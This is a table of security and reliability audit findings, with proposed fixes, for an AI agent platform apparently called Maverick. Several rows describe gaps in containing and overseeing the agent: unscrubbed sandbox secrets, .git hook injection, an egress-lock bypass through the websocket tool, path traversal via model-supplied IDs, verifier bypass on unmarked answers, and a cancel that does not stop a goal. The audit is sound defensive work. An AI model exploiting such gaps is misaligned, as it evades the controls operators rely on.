| W1-3 | high | core/llm model catalog | `packages/maverick-core/maverick/llm.py:47` | Catalogued model 'claude-opus-4-8-fast' is a phantom id sent verbatim to the API; fast mode needs speed='fast' + beta header and cannot work | In AnthropicClient._build_request, map MODEL_OPUS_FAST to model='claude-opus-4-8' + speed='fast' + the fast-mode beta (routing through client.beta.messages), or remove the SKU from MODEL_CATALOG/wizard until implemented. Add a request-shape test that asserts the outbound `model` never contains '-fast'. Note fast mode is unavailable on Bedrock/Vertex/Foundry and has its own rate limit; fall back to standard Opus on 429. |
| W2-45 | high | core/sandbox + tenant/kms | `packages/maverick-core/maverick/sandbox/local.py:22` | MAVERICK_KMS_KEK (tenant DEK wrapping key) is not scrubbed from the sandbox shell environment | Add `KEK` (and `SALT`, `SEED`, `SIGNING`) to _SECRET_ENV_RE, and add MAVERICK_KMS_KEK / MAVERICK_ENCRYPTION_KEY / MAVERICK_AUDIT_SIGNING_KEY_WRAPPED to _ALWAYS_STRIP_ENV as explicit records; add a test that every secret-bearing env name in docs/env-vars.md is stripped by scrub_env. |
| W2-3 | high | core/tools | `packages/maverick-core/maverick/tools/fs.py:199` | write_file allows writing under .git/ outside benchmark opaque mode (enables git-config hook injection) | In _safe_resolve / write_text_contained, unconditionally refuse any resolved path containing a `.git` segment for WRITES (keep the opaque-mode read block as-is). This closes the config-injection path even if a host git call is missed. |
| W2-94 | high | core/tools/http_fetch (urllib path) | `packages/maverick-core/maverick/tools/http_fetch.py:321` | guarded_urlopen breaks behind any HTTP(S) proxy on a private/loopback address: the pinned connection refuses the proxy host (reproduced on this box) | In _make_pinned_connect, detect proxied requests (self._tunnel_host is set, or req.host != urlparse(req.full_url).hostname) and skip pinning of the proxy hop (the target was already validated by _check_url_allowed; the proxy is operator-trusted), or explicitly pass ProxyHandler({}) to disable proxies for this opener and document that guarded fetches ignore proxies (matching safe_client). Add a regression test that sets HTTPS_PROXY to a 127.0.0.1 address and asserts guarded_urlopen does not raise BlockedHost-style errors. |
| W2-87 | high | core/tools/websocket | `packages/maverick-core/maverick/tools/websocket_tool.py:85` | websocket tool bypasses the enterprise tool-egress lock entirely (websockets library is not wrapped, no enterprise_egress_denial call) | In _run(), before resolve_pinned_ip, call enterprise.enterprise_egress_denial(url.replace('ws','http',1), tool='websocket') and tenant.egress.egress_allowed('websocket', host) and return the ERROR string on denial; add 'websockets.connect' to egress_contract._HTTP_CALLS mapped to a library that is NOT in COVERED_LIBRARIES so the module is recorded in KNOWN_UNCOVERED; add a test in test_enterprise_tool_egress.py that enables enterprise mode and asserts the websocket tool refuses a public host. |
| W1-52 | high | core/world_model | `packages/maverick-core/maverick/world_model.py:1213` | Per-thread SQLite reader connections are retained for the life of the WorldModel: short-lived threads leak a connection and two FDs each | Track reader connections with weakref/finalizers keyed on thread liveness: store them in a dict keyed by thread ident and prune entries whose thread is no longer alive on each _reader() call (or use a small bounded pool of reader connections handed out under a lock instead of thread-locals). Add a regression test that spawns N short-lived threads and asserts len(_reader_conns) stays bounded. |
| W1-46 | high | core/world_model_backends | `packages/maverick-core/maverick/world_model_backends/postgres.py:1588` | Postgres search_goals ignores the owner filter: non-admin dashboard search returns every user's goals on the HA backend | Add `owner = %s` to both the sealed scan-then-decrypt branch and the ILIKE branch of PostgresWorldModel.search_goals when owner is not None (mirror list_goals which already does), and add a Postgres-marked test that a second owner's goal is not returned. |
| W1-48 | high | core/world_model_backends | `packages/maverick-core/maverick/world_model_backends/postgres.py:2619` | PostgresWorldModel.total_spend takes no owner argument: /api/v1/spend and external-agent records 500 on Postgres | Add `owner: str \| None = None` to PostgresWorldModel.total_spend and add `AND g.owner = %s` (join goals already happens when a tenant is active; always join when owner is given). Cover with a parity test. |
| W1-47 | high | core/world_model_backends | `packages/maverick-core/maverick/world_model_backends/postgres.py:1352` | PostgresWorldModel.create_goal has no domain/project_id kwargs: checkpoint sub-goal spawning and the finance CLI raise TypeError on Postgres | Add `domain: str = ""` and `project_id: int \| None = None` to PostgresWorldModel.create_goal (the columns already exist via migrations v14/v15) and write them in the INSERT; add domain/project_id to PGGoal and _dec_goal_row. Add a signature-parity test (inspect.signature over the shared public surface) so the two backends cannot drift again. |
| W2-68 | high | core/world_model_backends | `packages/maverick-core/maverick/world_model_backends/postgres.py:1262` | Postgres RLS never checks the connection role for SUPERUSER/BYPASSRLS, so 'fail-closed' isolation is silently void under a privileged DSN | In PostgresWorldModel.__init__ when self._rls is true (and in pg_rls.preflight), run `SELECT rolsuper, rolbypassrls FROM pg_roles WHERE rolname = current_user` and raise RuntimeError('RLS cannot be enforced for a SUPERUSER/BYPASSRLS role') -- mirror governed_records._schema_status_on. Report it as a `ready=False` reason in `maverick tenant rls-preflight`. Add `NOSUPERUSER NOBYPASSRLS` to the CREATE ROLE snippet in deploy/postgres/README.md and a doctor check. |
| W2-8 | high | dashboard/auth (proxy SSO) | `packages/maverick-core/maverick/proxy_auth.py:86` | Reverse-proxy SSO identity can be spoofed by any loopback peer via X-Forwarded-For under uvicorn's default proxy-header handling | Make the transport peer authoritative for proxy_trusts: launch uvicorn with proxy_headers=False (or forwarded_allow_ips=[] ) whenever [auth.proxy] is enabled, or have proxy_trusts read the raw socket peer (e.g. keep it on scope['server']/transport before uvicorn rewrites, or set forwarded_allow_ips from trusted_proxies so only the pinned proxy may assert XFF). Add an ASGI-level regression test that wraps app in uvicorn.middleware.proxy_headers.ProxyHeadersMiddleware(trusted_hosts='127.0.0.1') and asserts a loopback peer with X-Forwarded-For=<pinned> is refused. Document FORWARDED_ALLOW_IPS in docs/security-hardening.md. |
| W3-18 | high | dashboard/settings_store + api features/switches | `packages/maverick-dashboard/maverick_dashboard/settings_store.py:441` | In-app feature switches for fleet_memory and entity_graph never persist: settings_store._dump allowlist silently drops both sections and the API returns a misleading 409 | Add 'fleet_memory' and 'entity_graph' (and generally every entry of SWITCHABLE_SECTIONS) to the _dump section list — e.g. `for section in dict.fromkeys((..., *SWITCHABLE_SECTIONS, *_LEARNING_SECTIONS, *_MODULE_TOP_SECTIONS))` — and add a parametrized round-trip test over SWITCHABLE_SECTIONS asserting load_overlay()[section]['enable'] after set_section_enable(). Consider making _dump fail loudly (log.error or raise) when a top-level key it does not know how to serialise is present instead of dropping it. |
| W5-27 | high | deploy/demo | `deploy/demo/run-demo.sh:50` | One-command demo prints a ?token= URL that the dashboard rejects with 401 | Update run-demo.sh to print the plain URL plus the token and instructions (Bearer header / OIDC or invite flow), and rewrite deploy/demo/README.md lines 10-12, 27-30, 45-47, 54-65 to match fly.toml/render.yaml. Better: add a minimal browser login form (or a cookie exchange endpoint) so a demo audience can use a link at all; the demo-cluster nginx-inject pattern is the current workaround. |
| W5-28 | high | deploy/terraform | `deploy/aws/terraform/rds.tf:28` | Production RDS has deletion_protection=false and skip_final_snapshot=true | Set deletion_protection = true, skip_final_snapshot = false with final_snapshot_identifier, add lifecycle { prevent_destroy = true } to aws_db_instance.main, and consider multi_az = true and copy_tags_to_snapshot = true. Document the one-time override path for intentional teardown. |
| W1-24 | high | kernel/agent-loop | `packages/maverick-core/maverick/agent.py:3818` | Domain-routed goals (packs / --domain) skip FINAL verification, the review checkpoint and the thinking budget because the root agent's role is the pack name, not 'orchestrator' | Introduce an explicit `is_root` predicate (depth == 0 and parent is None) and use it instead of `role == "orchestrator"` for verification, review checkpoint, thinking budget, prewarm and template selection (or set a separate `self.kind = 'root'` in agent_from_profile when depth == 0). Add a test that a domain-routed run_goal invokes verify_final. |
| W1-25 | high | kernel/agent-loop | `packages/maverick-core/maverick/agent.py:4176` | A text-only response without a FINAL: marker is accepted as the final answer with verifier_confidence=1.0, bypassing the verifier, coding-mode apply-check, STOP hooks and the run record | Route the no-tool-call text branch through the same FINAL handling: treat a text-only end_turn response as `final = resp.text` (optionally after one nudge 'end with FINAL:') so verification, patch validation, hooks and record writes apply; report verifier_confidence honestly (0.0/'not verified') when verification did not run. Add a loop test where the scripted answer lacks the marker and assert verify_final is invoked. |
| W1-23 | high | kernel/agent-loop + dashboard/api | `packages/maverick-dashboard/maverick_dashboard/api.py:9090` | Dashboard 'Cancel' never stops a running goal: the agent loop never reads goal status, contrary to the endpoint docstring | Add a goal-scoped stop check to the turn-boundary gate in Agent._run_inner (next to killswitch.check()/budget.check() at agent.py:3441-3450) and to the per-tool halt check at agent.py:4310, throttled like _mirror_live_spend (read world.get_goal(goal_id).status every ~1-5s) and returning AgentResult(error='cancelled'); or have cancel_goal arm a per-goal entry in the killswitch halt table that killswitch.check() consults with a goal_id scope. Fix the docstring either way and add a test that cancels mid-run and asserts no further LLM calls. |
| W5-2 | high | release/provenance | `deploy/verify-release.sh:47` | Release tags are mutable (no tag ruleset): v0.1.6 was re-pointed three times and keyless signatures bind only to the tag name | Add a second ruleset file (e.g. .github/rulesets/protect-release-tags.json, target 'tag', include refs/tags/v* and native-v*/desktop-v*) with deletion, non_fast_forward and update restrictions, import it, and extend test_the_ruleset_requires_every_blocking_check_and_the_queue to assert it exists. Enable GitHub's immutable-releases repository setting. Consider embedding the source SHA in verification (e.g. verify-release.sh also checks the certificate's source-repository-digest extension against the release's maverick-container-*.json source_revision). |
| W5-1 | high | repo-governance/rulesets | `.github/rulesets/protect-main.json:4` | Committed branch ruleset is not what the live repo enforces: PRs merge before required checks finish and the merge queue has never run | Re-import .github/rulesets/protect-main.json in Settings > Rules > Rulesets (or fix whatever bypass/disabled state exists), then add a scheduled workflow (e.g. weekly, plus on changes to the JSON) that runs `gh api repos/$GITHUB_REPOSITORY/rulesets` + `/rulesets/{id}` with a read-only token and diffs the live rule set against the committed file, failing (and opening an issue) on drift. Also fix the 'required check passes in 4s on PR' pattern only after the queue is actually enforced, otherwise `test (3.11, n)`/`posture (n)` are green stubs on every PR with nothing ever running them before merge. |
| W1-85 | high | sandbox/kubernetes | `packages/maverick-core/maverick/sandbox/kubernetes.py:110` | Kubernetes sandbox pod mounts the namespace ServiceAccount token (no automountServiceAccountToken:false, no seccomp, no read-only rootfs) | In _pod_overrides add "automountServiceAccountToken": False and "enableServiceLinks": False at spec level, "seccompProfile": {"type": "RuntimeDefault"} in the pod securityContext, and "readOnlyRootFilesystem": True plus an emptyDir at /tmp in the container. Add a unit test asserting these keys appear in the --overrides JSON. |
| W1-110 | high | tools/connectors | `packages/maverick-core/maverick/tools/asana_tool.py:203` | Hand-written connectors interpolate unencoded model-supplied IDs into API paths; dot-segments reach arbitrary endpoints (incl. writes) with the operator's credential | Add a shared `_path_segment(value)` helper in tools/__init__.py (urllib.parse.quote(value, safe='') plus a reject of '.', '..' and empty) and apply it to every interpolated id/slug/entity in asana, bitbucket, clickup, cloudflare, confluence, dynamics (and any g-z sibling with the same shape); add a regression test that `../` in each id yields ERROR rather than a request. |
| W1-111 | high | tools/database | `packages/maverick-core/maverick/tools/database_tool.py:168` | `database` tool accepts a model-supplied SQLAlchemy `url` with no scheme/host policy by default, so an agent can open any local SQLite file or any reachable DB server | Default-deny model-supplied `url`: only honor it when a capability allow_hosts is present or an explicit `[tools] database_allow_url_arg = true` knob is set; reject `sqlite:` URLs (or confine file paths to sandbox.workdir); log the effective host on every call. Add wizard/config knob per kernel rule 5. |
| W5-113 | medium | CHANGELOG | `CHANGELOG.md:319` | CHANGELOG stale: version 0.1.7 has no entry and the Unreleased section omits the September feature wave (AWS Terraform, Auth0, vendor onboarding, Cloudflare site, rolling deploys) | Add a `## [0.1.7]` heading (or bump on release), backfill the September PRs into Unreleased, and add a CI check that a PR touching packages/*/pyproject.toml version also touches CHANGELOG.md. |
| W5-7 | medium | ci/coverage | `sdks/plugin-ts/package.json:21` | The TypeScript plugin SDK (and consent-native, vscode-extension) is never built or tested in CI and has no lockfile | Commit a package-lock.json for sdks/plugin-ts (and the other two), add it to the OSV `--lockfile` list and the dependabot npm directories, and add a job (in ui-regressions.yml or a new sdk.yml with merge_group) running `npm ci && npm test` on Node 22.23.1. |
| W5-12 | medium | ci/pages-deploy | `.github/workflows/pages-deploy.yml:47` | pages-deploy runs an unpinned `npx --yes wrangler@4` with the Cloudflare API token in scope and no job timeout | Pin `wrangler@4.x.y` exactly (or vendor a package.json+lockfile under pitch/ and use `npm ci`), pin node to 22.23.1, add `timeout-minutes: 10`, and consider the official cloudflare/wrangler-action pinned by SHA with the token passed as an input rather than a step-wide env. |
| W5-61 | medium | ci/postgres | `.github/workflows/ci.yml:986` | Postgres-gated tests outside the CI postgres job's hard-coded file list never execute anywhere | Replace the explicit list with a marker (`@pytest.mark.postgres`) or `-k`/path glob (`packages/*/tests/test_*pg*.py`), and run `python -m pytest -m postgres` in the postgres job so every DSN-gated test executes. |
| W2-6 | medium | ci/security-gates | `.github/workflows/ci.yml:76` | CI `shell=True` confinement gate only scans apps/ and packages/ and matches a literal string | Extend the grep roots to `apps packages scripts benchmarks deploy sdks` (keep the /sandbox/ and /tests/ excludes) and match `shell\s*=\s*True` with a regex; consider also flagging `shell\s*=\s*[^F]` for manual review of non-literal values. |
| W5-63 | medium | ci/test-shard | `.github/actions/test-shard/action.yml:39` | About 30 optional-extra-gated tests (twilio, sympy, pandas, telegram, slack, matrix, chroma, langchain, qdrant, live smoke) are permanently skipped because the test job installs only core[openai] | Install the cheap extras in test-shard (`maverick-core[openai,math,pandas,chroma,langchain]`, `maverick-channels[telegram,slack,matrix,whatsapp]`), add a qdrant service like the postgres job for test_qdrant_isolation_live, and schedule test_live_smoke nightly with a CI secret. |
| W3-45 | medium | cli/chat | `packages/maverick-core/maverick/cli/__init__.py:4001` | `maverick chat` hard-codes --max-dollars=2.0, silently overriding the operator's `[budget] max_dollars` cap | Change the option to `default=None` (show_default of the config value in help) so budget_from_config's precedence works, exactly as `start` and `resume` already do. |
| W3-48 | medium | cli/cost | `packages/maverick-core/maverick/cli/__init__.py:7008` | `maverick cost` lifetime totals are silently truncated to the 10,000 most recent episodes while `budget`/`spend` use a SQL SUM | Use total_spend() for the summary path (with an optional month filter pushed into SQL), and stream episodes with pagination for --csv; print a 'truncated to N' note if any cap is retained. |
| W3-46 | medium | cli/debate+plan-reflect+watch | `packages/maverick-core/maverick/cli/__init__.py:4239` | `debate`, `plan-reflect` and `watch --run` build a raw Budget(), ignoring every `[budget]` config cap (dollars, wall-clock, tool calls) | Replace with `budget_from_config(task_class=..., max_dollars=max_dollars)` and make the --max-dollars default None (or show the config value) in all three commands. |
| W3-47 | medium | cli/global-options | `packages/maverick-core/maverick/cli/__init__.py:773` | Global `--db` is silently ignored by `spend`, `costs`, `diag health`, `diag cost-by-tag` and `schema-plan`; `workforce-graduation` defines a conflicting local `--db` | Pass `ctx.obj['db']` (add @click.pass_context) in the five commands; drop the local `--db` on workforce-graduation in favour of the global one. Add a test asserting every command that opens the world honours ctx.obj['db'] (grep for `open_world()` with no args in cli/). |
| W3-44 | medium | cli/mcp | `packages/maverick-core/maverick/cli/__init__.py:2920` | `maverick mcp` crashes with a raw traceback when MAVERICK_REQUIRE_ENTERPRISE=1 and a guarantee fails; `serve` handles the same error cleanly | Mirror `serve`: `try: require_enterprise_or_die() except EnterpriseRequiredError as e: click.echo(e.summary, err=True); sys.exit(3)`. Consider a shared helper used by serve/mcp/dashboard. |
| W3-43 | medium | cli/share | `packages/maverick-core/maverick/cli/__init__.py:3937` | `maverick share` dumps a raw httpx traceback on any GitHub HTTP/network error and never checks the goal exists before uploading | Wrap `share` with @_humane_errors (or catch httpx.HTTPError/OSError explicitly) and print a one-line 'GitHub rejected the upload (403): check GITHUB_TOKEN scopes'. Before building the payload, `world.get_goal(goal_id)` and exit 2 with 'no such goal' like `export` does. |
| W4-31 | medium | core/ai_cost_collectors | `packages/maverick-core/maverick/ai_cost_collectors.py:809` | Azure cost collector's default HTTP transport follows redirects and forwards the bearer token, unlike the OpenAI collector which explicitly disables redirects | Build the opener with a redirect-refusing HTTPRedirectHandler (reuse ai_cost_openai._NoRedirectHandler or move it to a shared helper), treat any 3xx as AICostCollectorProtocolError, and add a FakeAzureTransport test that returns 302 and asserts no follow. Consider routing through tools._ssrf.safe_client like ai_inventory does. |
| W4-32 | medium | core/ai_runtime_guardrails | `packages/maverick-core/maverick/ai_runtime_guardrails.py:439` | Runtime guardrails silently block 100% of traffic with an opaque 'shield/<stage>/error' rule when agent-shield is not installed; no preflight or distinct signal | In require_enabled()/_feature_flags (or maverick doctor and the wizard step) verify `import maverick_shield` succeeds and fail fast with a configuration error naming the missing package; emit a distinct rule id (e.g. 'shield/unavailable') and a log line when the factory raises ImportError so the outage is diagnosable; add a test for the shield-absent path. |
| W2-102 | medium | core/air_gap + observability | `packages/maverick-core/maverick/air_gap.py:161` | Air-gap telemetry audit sees only config: MAVERICK_SENTRY_DSN / MAVERICK_OTEL_EXPORTER env (which observability.py prefers) pass clean, and those exporters use urllib3/grpc stacks the egress guard cannot stop | Have _audit_telemetry also inspect MAVERICK_SENTRY_DSN, MAVERICK_OTEL_EXPORTER/ENDPOINT, MAVERICK_SIEM_TOKEN and MAVERICK_LICENSE_API from os.environ (with a flag to audit env), and document that Sentry/OTLP-gRPC bypass egress_guard so enterprise mode should refuse to initialise them unless their host is allow-listed. |
| W2-52 | medium | core/audit signing + trust receipts | `packages/maverick-core/maverick/audit/signing.py:526` | KMS-wrapped audit key is unwrapped on every call: 2 KMS Decrypt round-trips per AuditSigner construction and 1 per active_key_is_offhost() (trust receipts, per-request API) | Cache the unwrapped keypair (and a negative result with a short TTL) in a module-level cache like _INJECTED_KEYPAIR_CACHE; compute active_key_is_offhost from the cached selection made at signer init. |
| W2-47 | medium | core/audit signing key custody | `packages/maverick-core/maverick/audit/signing.py:511` | A configured KMS-wrapped audit signing key silently downgrades to a freshly generated co-located on-disk key when the KMS unwrap fails (non-enterprise) | Treat an explicitly configured off-host source as intent: if MAVERICK_AUDIT_SIGNING_KEY or _WRAPPED is set and cannot be used, raise OffHostSigningRequiredError (or at least refuse to generate a new local key) regardless of enterprise mode; make require_offhost_signing() return True whenever either env var is present. |
| W2-53 | medium | core/audit signing key custody | `packages/maverick-core/maverick/audit/signing.py:471` | Off-host audit key custody is still opt-in outside enterprise mode; default install signs with a co-located key while README still headlines 'Tamper-evident' | Either flip require_offhost_signing() to default-on whenever a KMS/injected source is configured or `maverick launch-check` is used (fail the launch row otherwise), and qualify README/docs claims with the custody condition; or keep default-off but add a launch-check row 'audit key custody: co-located (integrity only)'. |
| W2-50 | medium | core/audit verification | `packages/maverick-core/maverick/audit/signing.py:968` | verify_chain(pubkey_hex) accepts a single trusted key, so an externally-held pubkey cannot verify any chain that spans an audit key rotation | Accept a key registry (dict key_id->pubkey_hex, or a list) in verify_chain/verify_anchors/collect_node and `maverick audit verify --pubkey` (repeatable); select by row key_id and report 'untrusted_key_id' distinctly from bad_signature. trusted_audit_public_keys() already builds the right shape. |
| W2-97 | medium | core/audit/forwarder | `packages/maverick-core/maverick/audit/forwarder.py:123` | SIEM HTTP forwarder follows redirects with urllib: bearer forwarded cross-host / downgraded to http, and 301/302 turns the POST into a GET so the batch is dropped but counted as delivered | Install a custom HTTPRedirectHandler in _post_http_batch that raises on any redirect (SIEM collectors should not redirect), or at minimum refuses scheme downgrade/cross-host and re-POSTs the body on 307/308 only; add a test with a 302-to-http:// stub asserting a RuntimeError and no bearer on the second hop. |
| W4-66 | medium | core/compliance | `packages/maverick-core/maverick/compliance.py:145` | compliance_report() still hardcodes 'Audit logging (record-keeping)' as active without probing the writer (unresolved prior finding) | Probe writability the way the signing check does: attempt a throwaway append to the active audit directory (or call the writer's health probe) and report 'action_needed' with the error detail when it fails. |
| W5-58 | medium | core/config tests | `packages/maverick-core/tests/test_provider_base_url_plumbing.py:23` | Provider-environment tests clear a hand-copied subset of env vars and miss ANTHROPIC_BASE_URL/OPENAI_BASE_URL (4 of 6 baseline failures) | Add one autouse fixture in the root conftest that `monkeypatch.delenv`s every name in `maverick.config.PROVIDER_CREDENTIAL_ENV_VARS + PROVIDER_BASE_URL_ENV_VARS` plus MAVERICK_MODEL_OVERRIDE, and delete the three hand-maintained lists (tests that need a provider set it explicitly). |
| W5-114 | medium | core/config-lint | `docs/configuration.md:544` | docs/configuration.md documents a `[suites]` section that the runtime reads but `maverick config-lint`/`migrate` flag as unknown | Add `suites` to `KNOWN_SECTIONS`; add a test asserting every `[section]` in docs/configuration.md is in KNOWN_SECTIONS and (at least) every section wizard-written is documented; consider generating the 'Full schema' block from the registry. |
| W4-14 | medium | core/consent_application_scanner | `packages/maverick-core/maverick/consent_application_scanner.py:345` | _safe_xml DTD/ENTITY guard is bypassed by BOM-less UTF-16 manifests (entities are expanded) | Decode to text first (detect BOM/encoding declaration, reject non-UTF-8/UTF-16-with-BOM), run the DOCTYPE/ENTITY check on the decoded string, or use a parser with entity expansion disabled (defusedxml / XMLParser with forbid_dtd). Add a UTF-16 test vector. |
| W4-15 | medium | core/consent_global_opt_out | `packages/maverick-core/maverick/consent_global_opt_out.py:611` | Global Opt-Out configuration history hard-fails at 128 events, making a frequently edited configuration impossible to revoke or purge | Allow lifecycle transitions (revoked/purged) regardless of history length, or roll/compact history (keep a digest chain head plus the last N events) instead of failing; add a test at the bound. |
| W4-2 | medium | core/consent_preferences | `packages/maverick-core/maverick/consent_preferences.py:416` | Expired newer receipt falls through to an older permanent grant in enforcement decisions | In _decision_from_receipts, when the newest receipt contains a matching scope whose expiry has lapsed, return a terminal EnforcementDecision(False, "expired_grant") (or treat expiry as supersession) instead of continuing to older receipts; document the intended semantics and add tests for expired-newer-grant and expired-newer-deny cases. |
| W4-8 | medium | core/consent_registry | `packages/maverick-core/maverick/consent_registry.py:566` | OneTrust import silently records unparseable dates as 'now', defeating the backdate protection the module relies on | Treat an unparseable non-empty date as a skip (count under skipped with a reason), or try a small set of documented OneTrust formats; never fall back to ingest time for historical rows. Add a test with a non-ISO date. |
| W4-9 | medium | core/consent_registry | `packages/maverick-core/maverick/consent_registry.py:186` | Webhook/import recorded_at has no upper bound: a far-future timestamp permanently pins a consent status | Reject or clamp recorded_at > now + tolerance (e.g. 300 s) in record_consent; add a test. |
| W4-10 | medium | core/consent_registry | `packages/maverick-core/maverick/consent_registry.py:308` | export_receipts claims 'newest last-activity first' but sorts only the first `limit` rows of store order, not the newest N | Sort/scan the full bounded window (_SCAN_LIMIT, as subject_preferences does) and slice to limit, or add an index/ordering on last_recorded_at in the backend; document the truncation flag in the export. |
| W4-3 | medium | core/consent_standards | `packages/maverick-core/maverick/consent_standards.py:969` | GPP v1 header codec uses a non-IAB canonical form: real IAB header strings (DBABMA, DBACNYA, DBABLA) are rejected | Match the IAB spec: pad the bit string to a multiple of 8 before base64url (and accept either padding on decode, or at least the byte-padded form), replace the self-generated 'golden vectors' with the IAB spec examples (DBABMA, DBACNYA, DBABLA, DBABjw...), and fix the test at line 410. |
| W4-90 | medium | core/consumer_trust_center_authority | `packages/maverick-core/maverick/consumer_trust_center_authority.py:2320` | Trust-center authority exports become unverifiable and unreadable after rotating `signing_key_ref` | Resolve the key by the export's own `signing_key_ref` through the injected resolver (which already takes a ref argument) with an allow-list of retired refs, or persist the key ref generation alongside the export and support `historical_signing_key_refs`. |
| W4-63 | medium | core/control_plane_lease | `packages/maverick-core/maverick/control_plane_lease.py:51` | control_plane_lease docstring claims silent no-op flock 'fails closed'; the code can only fail closed when the OS returns an error | Either soften the docstring to 'fails closed only when the kernel reports that locking is unsupported', or actually demonstrate exclusion at startup (fork/spawn a short-lived child that attempts LOCK_EX\|LOCK_NB on the same path and must FAIL; if it succeeds, raise LeaseUnavailable). Surface the result on /readyz posture. |
| W2-48 | medium | core/crypto_at_rest | `packages/maverick-core/maverick/crypto_at_rest.py:698` | At-rest rotation keyring selects the active key by file mtime; a backup/restore (or same-tick rotate) silently reactivates an old key | Persist an explicit active-key pointer file in at_rest.d (as signing._save_keypair does) written by rotate_at_rest_key(); fall back to mtime only for legacy rings; have backup/restore preserve it. |
| W2-49 | medium | core/crypto_at_rest | `packages/maverick-core/maverick/crypto_at_rest.py:802` | Decrypt (read) path silently mints a new at_rest.key when the injected env key is absent, forking key material on a misconfigured node | Split _load_or_create_key into load (read paths, raises EncryptionUnavailable if absent) and load_or_create (seal path only); never create key material on a read. Consider refusing auto-generation when MAVERICK_ENCRYPTION_KEY_DIGEST is set (operator has declared an external key). |
| W2-93 | medium | core/egress_contract | `packages/maverick-core/maverick/egress_contract.py:19` | egress_contract census is blind to sockets, smtplib, websockets, grpc, boto3 and SDK-internal aiohttp, and marks audit/forwarder.py (raw TCP/UDP) as COVERED — contradicting its own docstring | Extend _HTTP_CALLS with socket.create_connection/socket.socket/socket.sendto, smtplib.SMTP/SMTP_SSL, imaplib.IMAP4_SSL, websockets.connect, grpc.insecure_channel/secure_channel/aio.*, boto3.client/resource, discord.Client, sentry_sdk.init, urllib3.PoolManager (mapped to non-covered library names), record the resulting modules in KNOWN_UNCOVERED with reasons, and rewrite the docstring to list exactly what the census can and cannot see. |
| W4-62 | medium | core/erasure_verify | `packages/maverick-core/maverick/erasure_verify.py:492` | erasure_verify.differential() treats an unchecked store as zero, so an INDETERMINATE 'after' report can yield verified=True | Make differential() take the full verify_erasure reports (or an explicit `indeterminate`/`errors` input) and force verified=False when any store is unchecked or when a key present in `before` is absent from `after`; wire it into `maverick erase` (capture counts pre-delete) / `erase-verify`, or remove the claim from FEATURES.md. |
| W1-71 | medium | core/github_app + dashboard webhook | `packages/maverick-core/maverick/github_app.py:337` | GitHub issue webhook runs blocking git subprocesses (up to 120s each) directly on the dashboard event loop | Run clone_repo and the git/gh steps via asyncio.to_thread (or make process_issue's git phases sync helpers executed with run_in_threadpool), keeping only run_goal awaited. Alternatively enqueue the whole issue->PR flow as a JobQueue job so it runs in a worker process. |
| W5-87 | medium | core/github_app + dashboard/webhooks | `packages/maverick-core/maverick/github_app.py:337` | GitHub issue→PR webhook runs blocking git subprocesses inside an async coroutine on the dashboard event loop | Wrap the git calls in `await asyncio.to_thread(subprocess.run, ...)` or switch to `asyncio.create_subprocess_exec` with `asyncio.wait_for(..., _GIT_TIMEOUT)`; do the same in coding_mode.evaluate_candidate; enable `ASYNC` in ruff so the pattern cannot return. |
| W4-65 | medium | core/governance_agents | `packages/maverick-core/maverick/governance_agents.py:3043` | GovernanceAgentStore.list_runs orders by revision count instead of recency (runtime string-replace of a non-existent column) | Add a persisted updated_at (or created_at) column to runs (with the schema bump handled by a real migration, see the schema-versioning finding) and ORDER BY updated_at DESC, run_id; or at minimum order by the payload's generated_at extracted into a column. Remove the string .replace(). Add a test creating 3 runs where the oldest has the most revisions and asserting list_runs order. |
| W3-49 | medium | core/health(doctor) | `packages/maverick-core/maverick/health.py:166` | `doctor` provider probes still have no client timeout — unresolved prior finding | Pass `timeout=5.0` (or a MAVERICK_DOCTOR_TIMEOUT knob) to both clients; report a timeout as the existing RED 'API unreachable' row. |
| W3-50 | medium | core/health(doctor) | `packages/maverick-core/maverick/health.py:613` | `doctor` config-perms check is POSIX-only: on Windows it always warns 'group/world-accessible' and prescribes `chmod 600` | Skip the mode-bit check when `os.name == 'nt'` and instead verify via the existing file_lock Windows DACL helpers (or icacls), with a Windows-appropriate fix hint; add a test that monkeypatches os.name. |
| W1-55 | medium | core/migration_governance | `packages/maverick-core/maverick/migration_governance.py:236` | Migration immutability ratchet is procedural only: --regen re-pins edited released versions, and fingerprinting the base SCHEMA as v1 forces a regen for every additive base-table change | Make write_lock() refuse (or require `--force-repin=<backend>:<version>` with a reviewable audit line) when a version already in the lock would change checksum; fingerprint SCHEMA per CREATE statement (split on ';') so an additive new table changes only a new entry; add a test that edits MIGRATIONS[2] and asserts --regen fails. |
| W2-51 | medium | core/oidc | `packages/maverick-core/maverick/oidc.py:406` | OIDC JWKS endpoint is fetched over whatever scheme is configured; http:// jwks_uri is accepted | Reject non-https jwks_uri in load_oidc_config()/_resolve_signing_key (mirror the issuer check), with an explicit dev-only override env if needed. |
| W2-56 | medium | core/operator_preflight + soc2 | `packages/maverick-core/maverick/operator_preflight.py:917` | operator_preflight/soc2 read MAVERICK_AUDIT_SIGNING_KEY from os.environ after the signer has already popped it, so in-process custody reports go stale | Derive custody from signing.active_key_is_offhost()/_injected_keypair() (the cached selection) instead of re-reading the env var; keep env reads only for the pre-init CLI path. |
| W1-5 | medium | core/preflight + context_scaling | `packages/maverick-core/maverick/preflight.py:30` | Preflight/context-scaling table caps Opus 4.8, 4.7 and Sonnet 4.6 at 200k although they are 1M-context models | Update _MODEL_CONTEXT_LIMITS to the published windows (1_000_000 for opus-4-6/4-7/4-8, sonnet-4-6, opus-5, sonnet-5; keep haiku-4-5 at 200k) and add the missing current ids; long term, populate the table from the Models API (`client.models.retrieve(id).max_input_tokens`) at doctor time and cache it, so new releases do not need a code change. |
| W4-45 | medium | core/privacy_data_discovery (detectors) | `packages/maverick-core/maverick/privacy_data_discovery.py:594` | Personal-data detector flags Unix timestamps as phone numbers/payment cards and C++ '::' as IP addresses | For phone: require a separator/parenthesis/leading + OR a field-name hint, and mark bare 10-digit runs ambiguous with lower confidence. For cards: require separators or a known IIN prefix (4, 51-55, 2221-2720, 34/37, 6011...) for bare digit runs. For IP: require at least two ':' groups containing a digit or a dotted-quad, and reject candidates adjacent to identifier characters. Add tests with epoch seconds/ms and C++ scope operators asserting no non-ambiguous detection. |
| W4-46 | medium | core/privacy_egress | `packages/maverick-core/maverick/privacy_egress.py:40` | Outbound PII redaction silently turns OFF when config.toml is unreadable/corrupt (fail-open privacy control) | In redact_egress_enabled(): call config_source_errors() and, if non-empty, either return True (redact) or raise so llm.py refuses the outbound call, logging which source failed. Mirror the pattern already used by the other enabled() functions. Add a test that corrupts config.toml and asserts the prompt is still redacted. |
